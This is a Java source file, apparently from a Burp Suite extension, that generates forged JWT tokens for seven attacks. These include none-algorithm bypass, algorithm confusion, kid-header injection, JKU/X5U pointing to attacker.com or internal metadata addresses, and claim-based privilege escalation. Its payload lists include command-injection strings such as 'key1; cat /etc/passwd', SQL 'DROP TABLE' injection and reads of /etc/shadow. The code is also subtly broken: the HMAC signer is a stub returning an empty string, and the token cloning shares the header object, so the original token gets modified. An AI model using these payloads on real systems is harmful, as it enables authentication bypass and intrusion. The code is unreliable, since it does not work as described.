package burp.jwt.attacks;

import burp.jwt.core.*;
import java.util.*;

/**
 * Advanced JWT Attack Platform - 7 specialized attack modules
 */
public class AdvancedAttackPlatform {
    
    private JWTToken token;
    
    public AdvancedAttackPlatform(JWTToken token) {
        this.token = token;
    }
    
    /**
     * 1. None Algorithm Bypass Attack
     * Removes signature verification completely
     */
    public JWTToken generateNoneAlgorithmBypass() {
        JWTToken attacked = cloneToken();
        attacked.getHeader().setAlg("none");
        attacked.setSignature("");
        return attacked;
    }
    
    /**
     * 2. Algorithm Confusion Attack (RS256 → HS256)
     * Generates 14+ variations of algorithm confusion attacks
     */
    public List<JWTToken> generateAlgorithmConfusionAttacks(String newSecret) {
        List<JWTToken> attacks = new ArrayList<>();
        
        // Original algorithm
        String originalAlg = token.getHeader().getAlg();
        
        // RS256 to HS256 variations
        String[] confusionVariations = {
            "HS256", "HS384", "HS512",
            "hs256", "hs384", "hs512",
            "HMAC256", "HMAC384", "HMAC512",
            "hmac256", "hmac384", "hmac512",
            "HmacSHA256", "HmacSHA384", "HmacSHA512"
        };
        
        for (String newAlg : confusionVariations) {
            JWTToken attacked = cloneToken();
            attacked.getHeader().setAlg(newAlg);
            
            // Try to sign with new secret using HS256 as base
            try {
                attacked.setSignature(generateHmacSignature(attacked, "HS256", newSecret));
                attacks.add(attacked);
            } catch (Exception e) {
                // Continue on error
            }
        }
        
        return attacks;
    }
    
    /**
     * 3. KID Parameter Injection Attack
     * 47+ payloads for path traversal and command injection
     */
    public List<JWTToken> generateKIDInjectionPayloads() {
        List<JWTToken> attacks = new ArrayList<>();
        
        // Path traversal payloads
        String[] kidPayloads = {
            // Path traversal
            "../public/key", "../../public/key", "../../../public/key",
            "..\\public\\key", "..\\..\\public\\key",
            "/etc/passwd", "/etc/shadow", "/etc/hosts",
            "C:\\Windows\\System32\\config\\SAM",
            "file:///etc/passwd", "file:///c:/windows/win.ini",
            
            // Command injection
            "key1; cat /etc/passwd", "key1 && whoami",
            "key1 | id", "key1 ` whoami `",
            "key1 $(whoami)", "key1 `id`",
            
            // SQL injection
            "1' OR '1'='1", "1'; DROP TABLE keys; --",
            "1' UNION SELECT * FROM keys --",
            
            // Template injection
            "{{7*7}}", "${7*7}", "#{7*7}",
            
            // LDAP injection
            "*)(uid=*))(|(uid=*", "admin*", "*admin*",
            
            // SSRF
            "http://localhost:8080/keys", "http://127.0.0.1:8080/admin",
            "http://169.254.169.254/metadata", "gopher://localhost:8080",
            "dict://localhost:6379", "sftp://localhost/etc/passwd",
            
            // Null byte
            "key1%00", "key1\\0", "key%00admin",
            
            // Unicode encoding
            "%2e%2e%2fkey", "%2e%2e%5ckeyname",
            "..%252fkey", "..%c0%afkey",
            
            // Other variations
            "key1;key2", "key1,key2", "key1|key2",
            "../key", "~key", "@key", "#key", "$key"
        };
        
        for (String payload : kidPayloads) {
            JWTToken attacked = cloneToken();
            attacked.getHeader().setKid(payload);
            attacks.add(attacked);
        }
        
        return attacks;
    }
    
    /**
     * 4. JKU/X5U Manipulation Attack
     * Remote key injection with automatic RSA key generation
     */
    public JWTToken generateJKUManipulation(String attacker_jku_url) {
        JWTToken attacked = cloneToken();
        attacked.getHeader().setJku(attacker_jku_url);
        return attacked;
    }
    
    /**
     * 4b. X5U Manipulation
     */
    public JWTToken generateX5UManipulation(String attacker_x5u_url) {
        JWTToken attacked = cloneToken();
        attacked.getHeader().setX5u(attacker_x5u_url);
        return attacked;
    }
    
    /**
     * Generate JKU/X5U URLs with common attack vectors
     */
    public List<String> generateMaliciousJKUURLs() {
        List<String> urls = new ArrayList<>();
        
        // External attacker URLs
        urls.add("https://attacker.com/jwks.json");
        urls.add("https://attacker.com/malicious/jwks");
        urls.add("http://attacker.com/.well-known/jwks.json");
        
        // SSRF/Internal network attacks
        urls.add("http://localhost:8080/.well-known/jwks.json");
        urls.add("http://127.0.0.1:8080/admin/keys");
        urls.add("http://169.254.169.254/metadata");
        urls.add("http://internal-api/keys");
        urls.add("http://192.168.1.1/admin");
        
        // Path traversal
        urls.add("file:///etc/passwd");
        urls.add("file:///etc/hosts");
        urls.add("file:///c:/windows/system32/config/sam");
        urls.add("../../../etc/passwd");
        urls.add("....//....//....//etc/passwd");
        
        // Protocol abuse
        urls.add("gopher://localhost:8080/keys");
        urls.add("dict://localhost:6379/get keys");
        urls.add("tftp://localhost/keys.json");
        
        return urls;
    }
    
    /**
     * 5. JWK Header Injection Attack
     * Embed malicious public keys directly in token headers
     */
    public JWTToken generateJWKHeaderInjection(String maliciousPublicKey) {
        JWTToken attacked = cloneToken();
        attacked.getHeader().getCustomFields().put("jwk", maliciousPublicKey);
        return attacked;
    }
    
    /**
     * 6. Privilege Escalation Attack
     * Systematic claim manipulation for privilege escalation
     */
    public JWTToken generatePrivilegeEscalation() {
        JWTToken attacked = cloneToken();
        Map<String, Object> payload = attacked.getPayload();
        
        // Modify role/permission claims
        payload.put("role", "admin");
        payload.put("is_admin", true);
        payload.put("admin", true);
        payload.put("permissions", Arrays.asList("read", "write", "delete", "admin"));
        payload.put("scope", "admin:*");
        payload.put("groups", Arrays.asList("administrators", "root"));
        payload.put("access_level", 999);
        
        // Remove restrictions
        if (payload.containsKey("restrictions")) {
            payload.remove("restrictions");
        }
        if (payload.containsKey("limitations")) {
            payload.remove("limitations");
        }
        
        return attacked;
    }
    
    /**
     * 7. Claim Spoofing Attack
     * Advanced payload generation for identity manipulation
     */
    public JWTToken generateClaimSpoofing(Map<String, Object> spoofedClaims) {
        JWTToken attacked = cloneToken();
        attacked.getPayload().putAll(spoofedClaims);
        return attacked;
    }
    
    /**
     * Generate common spoofing scenarios
     */
    public List<Map<String, Object>> generateCommonSpoofingScenarios() {
        List<Map<String, Object>> scenarios = new ArrayList<>();
        
        // Scenario 1: Admin impersonation
        Map<String, Object> adminSpoof = new LinkedHashMap<>();
        adminSpoof.put("sub", "admin");
        adminSpoof.put("name", "Administrator");
        adminSpoof.put("email", "admin@example.com");
        adminSpoof.put("role", "admin");
        scenarios.add(adminSpoof);
        
        // Scenario 2: Different user impersonation
        Map<String, Object> userSpoof = new LinkedHashMap<>();
        userSpoof.put("sub", "user123");
        userSpoof.put("name", "John Doe");
        userSpoof.put("email", "john@example.com");
        scenarios.add(userSpoof);
        
        // Scenario 3: Extended permissions
        Map<String, Object> extendedPerms = new LinkedHashMap<>();
        extendedPerms.put("permissions", Arrays.asList("read:all", "write:all", "delete:all"));
        extendedPerms.put("max_access_level", 9999);
        scenarios.add(extendedPerms);
        
        // Scenario 4: Time manipulation
        Map<String, Object> timeSpoof = new LinkedHashMap<>();
        timeSpoof.put("exp", 9999999999L); // Far future
        timeSpoof.put("iat", 0L);
        timeSpoof.put("nbf", 0L);
        scenarios.add(timeSpoof);
        
        return scenarios;
    }
    
    /**
     * Helper methods
     */
    private JWTToken cloneToken() {
        JWTToken clone = new JWTToken(
            token.getHeader(),
            new LinkedHashMap<>(token.getPayload()),
            token.getSignature(),
            token.getOriginalToken()
        );
        return clone;
    }
    
    private String generateHmacSignature(JWTToken token, String algorithm, String secret) throws Exception {
        // This is a placeholder - implement actual HMAC generation
        return "";
    }
}
